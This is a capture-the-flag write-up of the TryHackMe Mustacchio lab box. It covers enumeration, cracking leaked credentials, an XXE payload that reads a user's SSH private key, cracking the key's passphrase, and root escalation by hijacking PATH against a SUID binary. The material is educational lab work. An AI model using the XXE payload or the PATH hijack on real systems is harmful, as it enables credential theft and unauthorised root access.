---
published: true
---
Well hello people. This is a writeup of the Mustacchio CTF from Tryhackme. 
It was rated as a easy level box and it’s a really interesting challenge so 
without further due let’s start the hack.

![]({{site.baseurl}}/images/mustacchio/mustache.png)

Room : [Mustacchio](https://tryhackme.com/room/mustacchio)

## Nmap Scanning

>  nmap -p- IPADDR

We get the following ports open :

 - 22 ssh
 - 80 http
 - 8765 ultraseek-http

So after scanning we know there is a website running on this machine so lets hope on to it and have a look.

![]({{site.baseurl}}/images/mustacchio/site.png)

## Go Gobuster!!!

> gobuster dir -u http://IPADDR -w /path/to/wordlist

![]({{site.baseurl}}/images/mustacchio/gobuster.png)

After the scan you can see we got some directories. Most of them are dead ends but the `custom` has a .bak file in it. After downloading it we can see that it is some sort of a SQL backup file with some credentials.

![]({{site.baseurl}}/images/mustacchio/bak.png)

After using crackstation to crack the password we get the following credentails :

``` admin:bulldog19 ```

Now, lets check the 8765 port 

![]({{site.baseurl}}/images/mustacchio/login-page.png)

We get this login page. Hmm... let try those credential we just found. 

![]({{site.baseurl}}/images/mustacchio/xxe.png)

And we are in! Lets look at the source code.

![]({{site.baseurl}}/images/mustacchio/source.png)

We see these two interesting comments. The 2nd one tells us a username for the SSH login which is Barry. The 1st looks like a path. After checking the path we get a dontforget.bak file with some XML code written in it.

## XXE

We can try to read the id_rsa file on barry from the machine by binding a payload to the sample XML code we got from the dontforget.bak file

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

And we get the id_rsa but we have to format it properly by adding spaces and line breaks otherwise it will give an error while logging it.

## John The Ripper

Now lets crack the id_rsa as it is requires a passpharse to login

> /opt/johnTheRipper/ssh2John.py id_rsa  hash

> john hash --wordlist=/path/to/wordlist

And we get the passphrase : ``` urieljames```

## Logging into SSH

After logging in we get the user flag right away

![]({{site.baseurl}}/images/mustacchio/loginSSH.png)

## Privilege escalation

Lets look for SUIDs to exploit as it is given in the hint

> find / -perm -u=s -type f 2>/dev/null

We get a binary called live_log in joe's directory and luckily we can move into his directory as well.
After using strings on the binary file we see this interesting line

> tail -f /var/log/nginx/access.log

Intresting. Lets use this to gain root. Lets create a file named tail and make it executable and a script to get root. We have to change the path to our file as well

> echo "/bin/bash" > tail

> chmod +x tail

> export PATH=/tmp:$PATH

Now lets run the `live_log` binary.

![]({{site.baseurl}}/images/mustacchio/root.png)

And that's it. We got root. This was a fun box. Though i have to admit i had to take some hints on the way but still it was a great learning experience. Hope you enjoyed this as well :)
